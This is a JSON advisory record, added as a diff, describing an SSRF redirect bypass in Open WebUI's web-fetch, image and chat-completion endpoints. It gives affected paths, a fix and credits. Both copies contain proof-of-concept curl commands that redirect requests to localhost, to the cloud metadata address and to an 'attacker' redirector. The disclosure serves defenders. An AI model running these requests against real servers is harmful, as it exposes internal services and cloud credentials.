@@ -1,0 +1,100 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-45401",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "# Server-Side Request Forgery (SSRF) Bypass via HTTP Redirect Following in Web-Fetch, Image-Load, and Chat-Completion Endpoints\n\n## Summary\n\nThe `validate_url()` function in `backend/open_webui/retrieval/web/utils.py` only validates the *initial* URL submitted by the caller. The HTTP clients used downstream (sync `requests`, async `aiohttp`, langchain's `WebBaseLoader`) follow HTTP 3xx redirects by default and do **not** re-validate the redirect target against the private-IP / metadata-IP block list. Any authenticated user can therefore submit a public URL that 302-redirects to an internal address (e.g. `127.0.0.1`, `169.254.169.254`, RFC1918) and read the internal response body via the `/api/v1/retrieval/process/web` endpoint, the `/api/v1/images/...` endpoints, the `/api/chat/completions` endpoint with an `image_url` content part, and any other route that calls these helpers.\n\n## Affected code paths\n\nThe bypass exists across multiple call sites; each independently follows redirects without re-validation.\n\n### Path 1 - sync `_scrape` via `SafeWebBaseLoader`\n\n`backend/open_webui/retrieval/web/utils.py` - `SafeWebBaseLoader` inherits from `langchain_community.document_loaders.WebBaseLoader`. The parent's `_scrape()` calls `self.session.get(url, **self.requests_kwargs)`. `requests_kwargs` only sets `timeout`; `allow_redirects=False` is **not** passed, so `requests.Session.get()` follows redirects with the default `allow_redirects=True`. `validate_url()` is invoked once on the original URL only.\n\n### Path 2 - async `_fetch` (aiohttp)\n\n`backend/open_webui/retrieval/web/utils.py` - `_fetch()` previously inherited the aiohttp default `allow_redirects=True`. As of HEAD this path is fixed (`allow_redirects=False`). Listed for completeness.\n\n### Path 3 - `get_content_from_url` (sync `requests.get`)\n\n`backend/open_webui/retrieval/utils.py` - `response = requests.get(url, stream=True, timeout=30)`. No `allow_redirects=False`. Reached via `/api/v1/retrieval/process/web` (file ingestion) and other routers that resolve external URLs.\n\n### Path 4 - `load_url_image` (image edit)\n\n`backend/open_webui/routers/images.py` - image-URL fetching helper used by the image-edit endpoint. Same pattern: `validate_url()` checks only the initial URL, the underlying HTTP client follows redirects without re-validation. Reachable via `/api/v1/images/edit`.\n\n### Path 5 - `get_image_base64_from_url` (chat-completion image inlining)\n\n`backend/open_webui/utils/files.py` - `get_image_base64_from_url()` is invoked from `convert_url_images_to_base64()` in `backend/open_webui/utils/middleware.py` on every `/api/chat/completions` request whose message content includes an `image_url` part. The shared aiohttp session pool (`backend/open_webui/utils/session_pool.py`) does not override the aiohttp default `allow_redirects=True`, and the call site itself does not pass `allow_redirects=False`. This is the most reachable variant in the cluster: no special endpoint, no admin permission, no feature flag - any authenticated user can trigger it from a normal chat message.\n\n## Proof of concept\n\nAuthenticated low-privilege user; default config, no admin or special permissions required.\n\n```bash\ncurl -X POST https://<target>/api/v1/retrieval/process/web \\\n  -H \"Authorization: Bearer <any_user_token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"https://httpbin.org/redirect-to?url=http%3A%2F%2Flocalhost%3A8080%2Fapi%2Fconfig&status_code=302\"}'\n```\n\nResponse body contains the internal `/api/config` payload in `file.data.content`. Replace the redirect target with `http://169.254.169.254/latest/meta-data/` for cloud metadata, or any internal hostname reachable from the server.\n\nFor the chat-completion path (Path 5), the same redirect is followed when an `image_url` content part points to an attacker-controlled redirector:\n\n```bash\ncurl -X POST https://<target>/api/chat/completions \\\n  -H \"Authorization: Bearer <any_user_token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"model\":\"any\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"x\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"http://attacker/redirect-to-imdsv1\"}}]}]}'\n```\n\n## Impact\n\nAny authenticated user can read GET responses from any HTTP service reachable by the Open WebUI server process - cloud metadata services (IMDSv1 if available), localhost-bound application APIs, internal databases / monitoring / Kubernetes services, and VPN-bridged on-premise networks.\n\n## Recommended fix\n\nFor every call site that follows redirects, set `allow_redirects=False` on the underlying HTTP client and add a per-hop validation loop using `validate_url()` on each `Location:` header.\n\n## Credits\n\nPer the consolidation rule in SECURITY.md, credit goes only to reporters who FIRST identified a distinct sub-path that no earlier filing covered.\n\n- **tenbbughunters** - first to identify SafeWebBaseLoader sync `_scrape` (Path 1)\n- **YLChen-007** - first to identify `load_url_image` (Path 4)\n- **tempcollab** - first to identify aiohttp `_fetch` (Path 2)\n- **sneaXOR** - first to identify `get_content_from_url` (Path 3)\n- **nayakchinmohan** - first to identify `get_image_base64_from_url` in chat-completion middleware (Path 5)",
+    "ghsa_id": "GHSA-rh5x-h6pp-cjj6",
+    "html_url": "https://github.com/advisories/GHSA-rh5x-h6pp-cjj6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-rh5x-h6pp-cjj6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45401"
+      }
+    ],
+    "published_at": "2026-05-14T20:27:14Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-rh5x-h6pp-cjj6",
+      "https://github.com/advisories/GHSA-c6xv-rcvw-v685",
+      "https://github.com/open-webui/open-webui/releases/tag/v0.9.5",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-45401",
+      "https://github.com/advisories/GHSA-rh5x-h6pp-cjj6"
+    ],
+    "severity": "high",
+    "summary": "Open WebUI has a SSRF Bypass via HTTP Redirect Following in Web-Fetch and Image-Load Endpoints (not addressed by CVE-2025-65958)",
+    "updated_at": "2026-05-28T21:50:23Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.5",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.9.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-rh5x-h6pp-cjj6",
+  "repo": {
+    "cve_id": "CVE-2026-45401",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "# Server-Side Request Forgery (SSRF) Bypass via HTTP Redirect Following in Web-Fetch, Image-Load, and Chat-Completion Endpoints\r\n\r\n## Summary\r\n\r\nThe `validate_url()` function in `backend/open_webui/retrieval/web/utils.py` only validates the *initial* URL submitted by the caller. The HTTP clients used downstream (sync `requests`, async `aiohttp`, langchain's `WebBaseLoader`) follow HTTP 3xx redirects by default and do **not** re-validate the redirect target against the private-IP / metadata-IP block list. Any authenticated user can therefore submit a public URL that 302-redirects to an internal address (e.g. `127.0.0.1`, `169.254.169.254`, RFC1918) and read the internal response body via the `/api/v1/retrieval/process/web` endpoint, the `/api/v1/images/...` endpoints, the `/api/chat/completions` endpoint with an `image_url` content part, and any other route that calls these helpers.\r\n\r\n## Affected code paths\r\n\r\nThe bypass exists across multiple call sites; each independently follows redirects without re-validation.\r\n\r\n### Path 1 - sync `_scrape` via `SafeWebBaseLoader`\r\n\r\n`backend/open_webui/retrieval/web/utils.py` - `SafeWebBaseLoader` inherits from `langchain_community.document_loaders.WebBaseLoader`. The parent's `_scrape()` calls `self.session.get(url, **self.requests_kwargs)`. `requests_kwargs` only sets `timeout`; `allow_redirects=False` is **not** passed, so `requests.Session.get()` follows redirects with the default `allow_redirects=True`. `validate_url()` is invoked once on the original URL only.\r\n\r\n### Path 2 - async `_fetch` (aiohttp)\r\n\r\n`backend/open_webui/retrieval/web/utils.py` - `_fetch()` previously inherited the aiohttp default `allow_redirects=True`. As of HEAD this path is fixed (`allow_redirects=False`). Listed for completeness.\r\n\r\n### Path 3 - `get_content_from_url` (sync `requests.get`)\r\n\r\n`backend/open_webui/retrieval/utils.py` - `response = requests.get(url, stream=True, timeout=30)`. No `allow_redirects=False`. Reached via `/api/v1/retrieval/process/web` (file ingestion) and other routers that resolve external URLs.\r\n\r\n### Path 4 - `load_url_image` (image edit)\r\n\r\n`backend/open_webui/routers/images.py` - image-URL fetching helper used by the image-edit endpoint. Same pattern: `validate_url()` checks only the initial URL, the underlying HTTP client follows redirects without re-validation. Reachable via `/api/v1/images/edit`.\r\n\r\n### Path 5 - `get_image_base64_from_url` (chat-completion image inlining)\r\n\r\n`backend/open_webui/utils/files.py` - `get_image_base64_from_url()` is invoked from `convert_url_images_to_base64()` in `backend/open_webui/utils/middleware.py` on every `/api/chat/completions` request whose message content includes an `image_url` part. The shared aiohttp session pool (`backend/open_webui/utils/session_pool.py`) does not override the aiohttp default `allow_redirects=True`, and the call site itself does not pass `allow_redirects=False`. This is the most reachable variant in the cluster: no special endpoint, no admin permission, no feature flag - any authenticated user can trigger it from a normal chat message.\r\n\r\n## Proof of concept\r\n\r\nAuthenticated low-privilege user; default config, no admin or special permissions required.\r\n\r\n```bash\r\ncurl -X POST https://<target>/api/v1/retrieval/process/web \\\r\n  -H \"Authorization: Bearer <any_user_token>\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"url\": \"https://httpbin.org/redirect-to?url=http%3A%2F%2Flocalhost%3A8080%2Fapi%2Fconfig&status_code=302\"}'\r\n```\r\n\r\nResponse body contains the internal `/api/config` payload in `file.data.content`. Replace the redirect target with `http://169.254.169.254/latest/meta-data/` for cloud metadata, or any internal hostname reachable from the server.\r\n\r\nFor the chat-completion path (Path 5), the same redirect is followed when an `image_url` content part points to an attacker-controlled redirector:\r\n\r\n```bash\r\ncurl -X POST https://<target>/api/chat/completions \\\r\n  -H \"Authorization: Bearer <any_user_token>\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"model\":\"any\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"x\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"http://attacker/redirect-to-imdsv1\"}}]}]}'\r\n```\r\n\r\n## Impact\r\n\r\nAny authenticated user can read GET responses from any HTTP service reachable by the Open WebUI server process - cloud metadata services (IMDSv1 if available), localhost-bound application APIs, internal databases / monitoring / Kubernetes services, and VPN-bridged on-premise networks.\r\n\r\n## Recommended fix\r\n\r\nFor every call site that follows redirects, set `allow_redirects=False` on the underlying HTTP client and add a per-hop validation loop using `validate_url()` on each `Location:` header.\r\n\r\n## Credits\r\n\r\nPer the consolidation rule in SECURITY.md, credit goes only to reporters who FIRST identified a distinct sub-path that no earlier filing covered.\r\n\r\n- **tenbbughunters** - first to identify SafeWebBaseLoader sync `_scrape` (Path 1)\r\n- **YLChen-007** - first to identify `load_url_image` (Path 4)\r\n- **tempcollab** - first to identify aiohttp `_fetch` (Path 2)\r\n- **sneaXOR** - first to identify `get_content_from_url` (Path 3)\r\n- **nayakchinmohan** - first to identify `get_image_base64_from_url` in chat-completion middleware (Path 5)",
+    "ghsa_id": "GHSA-rh5x-h6pp-cjj6",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-rh5x-h6pp-cjj6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-rh5x-h6pp-cjj6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45401"
+      }
+    ],
+    "published_at": "2026-05-10T19:43:36Z",
+    "references": [],
+    "severity": "high",
+    "summary": "SSRF Bypass via HTTP Redirect Following in Web-Fetch and Image-Load Endpoints (not addressed by CVE-2025-65958)",
+    "updated_at": "2026-05-12T18:04:19Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.5",
+        "vulnerable_version_range": "<= 0.9.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
